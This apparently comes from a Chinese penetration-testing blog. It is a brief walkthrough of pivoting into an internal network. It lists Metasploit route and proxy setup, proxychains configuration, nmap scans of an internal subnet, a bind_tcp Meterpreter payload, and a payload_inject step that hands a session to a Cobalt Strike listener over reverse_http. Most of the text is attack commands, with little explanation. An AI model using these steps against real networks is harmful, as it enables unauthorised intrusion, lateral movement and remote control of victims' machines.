内网代理渗透

开启路由

开启代理模块

设置proxychains代理

我前面有文章提到过就是proxychains4不能用的问题，安装个proxychains就行了.....

apt-get install proxychains
vim /etc/proxychains.conf

利用nmap扫描存活主机和端口

走的TCP协议，所以-sT
nmap -sT -Pn 10.10.10.0/24
nmap -sT -Pn 10.10.10.129

MSF自带扫描端口

use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.129
set threads 5

开启MSF监听

注意bind连接，所以连接的是二层内网的机器

set payload windows/meterpreter/bind_tcp
set lhost 10.10.10.129
set lport 5555

此处我派生给CS进行操作

use exploit/windows/local/payload_inject 
set PAYLOAD windows/meterpreter/reverse_http //cs监听器中相同
set DisablePayloadHandler true //告诉msf已建立监听，不必新建监听
set LHOST 192.168.31.52 //cs的IP
set LPORT 6666 //cs监听器中监听的端口
set SESSION 1  
run

MSF内提权的shell不能派生给CS，所以重新提权了
